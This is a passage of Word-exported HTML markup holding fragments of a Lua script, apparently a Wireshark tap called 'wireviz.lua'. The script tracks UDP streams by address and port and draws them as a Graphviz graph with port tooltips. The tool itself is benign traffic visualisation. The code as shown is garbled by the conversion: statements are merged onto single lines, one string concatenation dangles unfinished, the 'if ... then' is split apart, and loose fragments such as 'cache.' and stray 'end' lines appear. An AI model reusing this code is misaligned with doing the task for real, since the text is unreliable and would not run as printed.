style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ipsrc = tostring(ip_src()) local ipdst = tostring(ip_dst())</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local udpsrc = tostring(udp_src()) local udpdst = tostring(udp_dst())</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--a 'udp stream' will just be a key that is the</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section309" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:-0.3500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;letter-spacing:-0.0500pt;font-size:12.0000pt;" >ip:port:ip:port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >udpdst</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >udpsrc</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:10.9500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >local udp_streama = ipsrc .. udpsrc .. ipdst .. local udp_streamb = ipdst .. udpdst .. ipsrc ..</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--we processed this 'stream' already</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:33.9500pt;text-indent:-28.8000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >if streams[udp_streama] or streams[udp_streamb] return</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:13.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section310" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:16.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  align=right  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:0.0000pt;text-indent:0.0000pt;text-align:right;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:88.2500pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--build out the stream info table local streaminfo = {} streaminfo["ipsrc"] = ipsrc streaminfo["ipdst"] = ipdst streaminfo["psrc"] = udpsrc streaminfo["pdst"] = udpdst streaminfo["istcp"] = false</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >streams[udp_streama] = streaminfo</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section311" ><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section312" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:7.5000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >cache.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:5.0500pt;margin-right:266.2000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of tap.packet() end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:44.9500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- just defining an empty tap.reset function function tap.reset()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:273.4000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of tap.reset() end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >-- define the draw function to print out our created arp function tap.draw()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:7.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section313" ><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:187.0500pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create a graphviz unigraph G = gv.graph("wireviz.lua")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:152.1000pt;margin-left:123.1000pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for k,v in pairs(streams) do local streaminfo =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >streams[k]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create nodes for src and dst ip</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local tmp_s = gv.node(G, streaminfo["ipsrc"]) local tmp_d = gv.node(G, streaminfo["ipdst"])</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--lets connect them up</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local tmp_e = gv.edge(tmp_s, tmp_d) gv.setv(tmp_s, "URL", "")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local s_tltip = gv.getv(tmp_s,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"tooltip") local d_tltip = gv.getv(tmp_d,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"tooltip")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gv.setv(tmp_s, "tooltip", s_tltip ..</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"\n"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >.. streaminfo["psrc"])</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gv.setv(tmp_d, "tooltip", d_tltip .. "\n"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p 